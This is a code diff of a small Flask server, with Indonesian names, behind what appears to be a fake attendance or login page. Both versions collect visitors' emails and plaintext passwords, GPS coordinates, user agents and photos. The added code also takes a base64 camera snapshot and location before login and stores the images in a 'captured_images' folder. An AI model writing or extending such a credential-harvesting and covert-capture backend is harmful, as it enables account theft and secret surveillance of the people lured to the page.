@@ -1,40 +1,52 @@
-from flask import Flask, request, render_template
-import os
-from datetime import datetime
-import csv
+from flask import Flask, render_template, request
+import os, base64
 
 app = Flask(__name__)
-UPLOAD_FOLDER = "captured_images"
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+CAPTURE_DIR = "captured_images"
+os.makedirs(CAPTURE_DIR, exist_ok=True)
 
-@app.route("/")
+@app.route('/')
 def index():
     return render_template("index.html")
 
-@app.route("/submit", methods=["POST"])
-def submit():
-    email = request.form.get("email")
-    password = request.form.get("password")
-    latitude = request.form.get("latitude")
-    longitude = request.form.get("longitude")
-    device = request.form.get("device")
-    photo = request.files.get("photo")
-
-    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-    if photo:
-        filename = f"{email}_{timestamp}.jpg"
-        photo.save(os.path.join(UPLOAD_FOLDER, filename))
-
-    with open("absensi_log.csv", "a", newline="") as f:
-        writer = csv.writer(f)
-        writer.writerow([timestamp, email, password, latitude, longitude, device])
-
+# terima foto awal
+@app.route('/berhasil_awal', methods=['POST'])
+def berhasil_awal():
+    data = request.get_json()
+    if data and "photo" in data:
+        save_photo(data["photo"], "awal")
+    print("Lokasi awal:", data.get("lat"), data.get("lon"), "UA:", data.get("ua"))
     return "OK"
 
-@app.route("/berhasil")
+# terima foto + form login
+@app.route('/berhasil', methods=['POST'])
 def berhasil():
-    return render_template("berhasil.html")
+    photo = request.form.get("photo")
+    email = request.form.get("email")
+    password = request.form.get("password")
+    ua = request.form.get("ua")
+    if photo:
+        save_photo(photo, "login")
+    print("Login:", email, password, "UA:", ua)
+    return "OK"
 
-if __name__ == "__main__":
+@app.route('/form_laporan')
+def form_laporan():
+    return render_template("indanout.html")
+
+def save_photo(photo_data, label):
+    try:
+        header, encoded = photo_data.split(",", 1)
+        data = base64.b64decode(encoded)
+        filename = f"{label}_{len(os.listdir(CAPTURE_DIR))+1}.jpg"
+        path = os.path.join(CAPTURE_DIR, filename)
+        with open(path, "wb") as f:
+            f.write(data)
+        print(f"Foto disimpan: {path}")
+    except Exception as e:
+        print("Gagal simpan foto:", e)
+
+if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+    app.run(host='0.0.0.0', port=port)
+        
